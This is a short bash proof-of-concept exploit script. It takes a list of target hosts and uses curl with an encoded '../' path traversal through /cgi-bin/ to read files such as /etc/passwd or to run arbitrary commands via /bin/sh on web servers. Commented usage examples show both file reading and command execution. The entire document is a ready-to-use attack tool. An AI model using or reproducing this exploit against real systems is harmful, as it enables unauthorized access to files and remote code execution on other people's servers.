#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
echo $3
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2" 

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
            
